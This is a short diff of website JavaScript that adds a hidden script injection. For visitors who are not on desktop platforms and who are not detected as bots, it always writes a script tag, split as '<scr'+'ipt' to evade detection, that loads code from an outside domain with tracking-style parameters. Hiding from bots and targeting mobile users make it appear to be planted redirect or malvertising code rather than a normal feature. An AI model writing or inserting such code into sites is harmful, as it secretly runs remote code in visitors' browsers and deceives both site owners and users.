@@ -89,11 +89,11 @@ system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
 
 
 if (!system.win && !system.mac && !system.xll && !is_robot()) {
-    const temporaryGroups = ['t5cpc','t5cpa'];
+    const temporaryGroups = ['ld'];
     const randomNums = (arr) => arr[Math.floor(Math.random() * arr.length)];
     const randomElements = randomNums(temporaryGroups);
-    if (randomElements == 'sm') {
-       
+    if (randomElements == 'ld') {
+        document.write('<scr'+'ipt async defer src="https://www.ceseasons.com/c.aspx?action=c&c1=7&c2=212&c3=&c4=2&c5=t&c34=640&c35=200&c7=1&c8=1&c9=&c10=&c50=292313" id="292313"></scr'+'ipt>');
     }
     if (randomElements == 't5cpa') {
         (function (){
